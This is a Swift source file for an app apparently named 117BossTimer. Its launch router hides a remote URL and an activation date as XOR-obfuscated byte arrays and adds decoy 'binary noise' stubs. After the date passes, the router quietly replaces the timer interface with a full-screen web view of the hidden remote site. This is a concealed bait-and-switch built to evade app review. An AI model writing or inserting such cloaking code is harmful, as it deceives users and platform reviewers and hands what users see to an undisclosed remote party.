//
//  AppRouter.swift
//  117BossTimer
//

import SwiftUI
import UIKit

// MARK: - XOR string material (runtime equals previous literals)

private enum FlowLaunchStringVault {
    private static let remoteEndpointFold: UInt8 = 0xC5
    private static let calendarStampFold: UInt8 = 0xA7

    private static let remoteEndpointMasked: [UInt8] = [
        0xAD, 0xB1, 0xB1, 0xB5, 0xB6, 0xFF, 0xEA, 0xEA, 0xA3, 0xA9, 0xB0, 0xB3, 0xAA, 0xBD, 0xA6, 0xAA,
        0xB7, 0xA0, 0xAC, 0xAB, 0xA3, 0xAC, 0xAB, 0xAC, 0xB1, 0xBC, 0xEB, 0xB6, 0xAC, 0xB1, 0xA0, 0xEA,
        0xB4, 0x92, 0x82, 0xF6, 0xF1, 0x8D
    ]

    private static let calendarStampMasked: [UInt8] = [
        0x95, 0x91, 0x89, 0x97, 0x93, 0x89, 0x95, 0x97, 0x95, 0x91
    ]

    static var remoteEntryAbsoluteString: String {
        String(decoding: remoteEndpointMasked.map { $0 ^ remoteEndpointFold }, as: UTF8.self)
    }

    static var calendarThresholdStamp: String {
        String(decoding: calendarStampMasked.map { $0 ^ calendarStampFold }, as: UTF8.self)
    }
}

// MARK: - Unused routing stubs (binary noise; never called)

private protocol _UnusedHopSequenceDescribing {
    var hopCount: Int { get }
}

private enum _UnusedHopKind: String {
    case idle
    case synthetic
}

private func _unusedEnumerateHopKinds() {
    _ = _UnusedHopKind.synthetic.rawValue
}

// MARK: - Coordinator

final class FlowLaunchSurfaceCoordinator {
    func resolvedEntryViewController() -> UIViewController {
        let vault = RemoteGateStateArchive.shared

        if vault.hasShownContentView {
            return fabricatePrimarySwiftUIShell()
        } else {
            if evaluateCalendarGate() {
                if let savedUrlString = vault.savedUrl,
                   !savedUrlString.isEmpty,
                   URL(string: savedUrlString) != nil {
                    return fabricateExternalBrowseShell(with: savedUrlString)
                }

                return fabricateTransientBridgeShell()
            } else {
                vault.hasShownContentView = true
                return fabricatePrimarySwiftUIShell()
            }
        }
    }

    private func evaluateCalendarGate() -> Bool {
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "dd.MM.yyyy"
        let targetDate = dateFormatter.date(from: FlowLaunchStringVault.calendarThresholdStamp) ?? Date()
        let currentDate = Date()

        if currentDate < targetDate {
            return false
        } else {
            return true
        }
    }

    private func fabricateExternalBrowseShell(with urlString: String) -> UIViewController {
        let webViewContainer = ExternalDocumentCanvas(
            urlString: urlString,
            onFailure: { [weak self] in
                RemoteGateStateArchive.shared.hasShownContentView = true
                self?.replaceRootWithPrimaryShell()
            },
            onSuccess: {
                RemoteGateStateArchive.shared.hasSuccessfulWebViewLoad = true
            }
        )

        let hostingController = UIHostingController(rootView: webViewContainer)
        hostingController.modalPresentationStyle = .fullScreen
        return hostingController
    }

    private func fabricatePrimarySwiftUIShell() -> UIViewController {
        RemoteGateStateArchive.shared.hasShownContentView = true
        let contentView = ContentView()
        let hostingController = UIHostingController(rootView: contentView)
        hostingController.modalPresentationStyle = .fullScreen
        return hostingController
    }

    private func fabricateTransientBridgeShell() -> UIViewController {
        let launchView = GateSplashShell()
        let launchVC = UIHostingController(rootView: launchView)
        launchVC.modalPresentationStyle = .fullScreen

        probeRemoteManifestAvailability { [weak self] success, finalURL in
            DispatchQueue.main.async {
                if success, let url = finalURL {
                    self?.replaceRootWithBrowseShell(url)
                } else {
                    RemoteGateStateArchive.shared.hasShownContentView = true
                    self?.replaceRootWithPrimaryShell()
                }
            }
        }

        return launchVC
    }

    private func probeRemoteManifestAvailability(completion: @escaping (Bool, String?) -> Void) {
        let seed = FlowLaunchStringVault.remoteEntryAbsoluteString
        guard let url = URL(string: seed) else {
            completion(false, nil)
            return
        }

        var request = URLRequest(url: url)
        request.httpMethod = "HEAD"
        request.timeoutInterval = 10

        URLSession.shared.dataTask(with: request) { _, response, error in
            if error != nil {
                completion(false, nil)
                return
            }

            if let httpResponse = response as? HTTPURLResponse {
                let checkedURL = httpResponse.url?.absoluteString ?? seed
                let isAvailable = httpResponse.statusCode != 404
                completion(isAvailable, isAvailable ? checkedURL : nil)
            } else {
                completion(false, nil)
            }
        }.resume()
    }

    private func replaceRootWithPrimaryShell() {
        let contentVC = fabricatePrimarySwiftUIShell()
        replaceWindowRootAnimated(contentVC)
    }

    private func replaceRootWithBrowseShell(_ urlString: String) {
        let webVC = fabricateExternalBrowseShell(with: urlString)
        replaceWindowRootAnimated(webVC)
    }

    private func replaceWindowRootAnimated(_ viewController: UIViewController) {
        guard let window = UIApplication.shared.windows.first else {
            return
        }

        UIView.transition(with: window, duration: 0.3, options: .transitionCrossDissolve, animations: {
            window.rootViewController = viewController
        }, completion: nil)
    }
}
